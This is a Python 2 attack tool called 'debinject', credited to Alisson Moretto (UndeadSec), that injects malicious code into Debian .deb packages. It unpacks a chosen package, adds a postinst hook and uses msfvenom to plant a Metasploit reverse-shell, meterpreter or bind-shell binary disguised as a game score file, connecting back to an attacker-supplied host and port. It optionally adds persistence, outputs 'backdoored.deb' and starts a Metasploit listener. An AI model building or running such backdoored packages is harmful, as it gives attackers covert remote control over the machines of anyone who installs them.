#!/usr/bin/env python
# -*- coding: utf-8 -*-
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
#-------------------------------
from os import system
#-------------------------------
system('clear')
print """

 --------------------{1}
┌┬┐┌─┐┌┐ ┬┌┐┌ ┬┌─┐┌─┐┌┬┐   
 ││├┤ ├┴┐││││ │├┤ │   │ BY: {3}ALISSON MORETTO{1} (Undead{2}Sec{1},{1} 4w4k3) {0}
─┴┘└─┘└─┘┴┘└┘└┘└─┘└─┘ ┴ 	     {1}v.1.0
{0} --------------------{1}

""".format(GREEN, END, RED, YELLOW)
#-------------------------------
system('rm -Rf output')
system("rm -Rf /tmp/evil")
print '~ / Inject malicious codes into *.deb\'s\n '
print "{0}[-] Insert *.deb file path: {1}".format(YELLOW, END)
file_path = raw_input("\n{0}debinject{1} > ".format(GREEN, END))
print "\n{0}[-] Insert LHOST: {1}".format(YELLOW, END)
LHOST = raw_input("\n{0}debinject{1} > ".format(GREEN, END))
print "\n{0}[-] Insert LPORT: {1}".format(YELLOW, END)
LPORT = raw_input("\n{0}debinject{1} > ".format(GREEN, END))
#-------------------------------
system('mkdir /tmp/evil')
system('cp ' + file_path + ' /tmp/evil/original.deb')
system('dpkg -x /tmp/evil/original.deb /tmp/evil/work')
system('mkdir /tmp/evil/work/DEBIAN')
#-------------------------------
print '\nInsert the target arch x86 or x64: '
arch = raw_input("\n{0}debinject{1} > ".format(GREEN, END))
if arch == 'x64':
    system('cp Utils/x64/control /tmp/evil/work/DEBIAN')
    system('cp Utils/x64/postinst /tmp/evil/work/DEBIAN')
elif arch == 'x86':
    system('cp Utils/x86/control /tmp/evil/work/DEBIAN')
    system('cp Utils/x86/postinst /tmp/evil/work/DEBIAN')
else:
    print "\nChoose [x64] or [x86]"
#-------------------------------
print "\n - CHOOSE THE PAYLOAD -  "
print "\n[1] metasploit/linux/<arch>/shell/reverse_tcp"
print "\n[2] metasploit/linux/<arch>/meterpreter/reverse_tcp"
print "\n[3] metasploit/linux/<arch>/meterpreter/bind_tcp"
print "\n[4] metasploit/linux/<arch>/shell/bind_tcp"
option = raw_input("\n{0}debinject{1} > ".format(GREEN, END))
if option == '1':
    system('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/shell/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores')
elif option == '2':
    system('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores')
elif option == '3':
    system('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/meterpreter/bind_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores')
elif option == '4':
    system('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/shell/bind_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores')
else:
    print "\nInvalid"
    system('exit')
#-------------------------------
persistence = raw_input('\nDo you want to enable persistence?(y/n) : ')
if persistence.upper() == 'Y':
    system('cp Utils/Persistence/kernellog /tmp/evil/work/usr/games/')

#-------------------------------
system('chmod 755 /tmp/evil/work/DEBIAN/postinst')
system('cd /tmp/evil/work/DEBIAN && dpkg-deb --build /tmp/evil/work')
system('rm -Rf output/ && mkdir output')
system('mv /tmp/evil/work.deb output/backdoored.deb && chmod 755 output/backdoored.deb')
#-------------------------------
print "\n The .deb backdoored saved to: /output/backdoored.deb\n"
listen = raw_input("Do you want to start listener? (y/n): ")
if option != '3' and option != '4':
    if listen.upper() == "Y":
        if option == '1':
	    system('service postgresql start')
            system('msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/' + arch + '/shell/reverse_tcp; set LHOST ' + LHOST + '; set LPORT ' + LPORT + '; run; exit -y"')
	elif option == '2':
	    system('service postgresql start')
            system('msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/' + arch + '/meterpreter/reverse_tcp; set LHOST ' + LHOST + '; set LPORT ' + LPORT + '; run; exit -y"')
    else:
        print "Bye :D"
else:
    print "\nStart Metasploit listener and Happy Hacking"


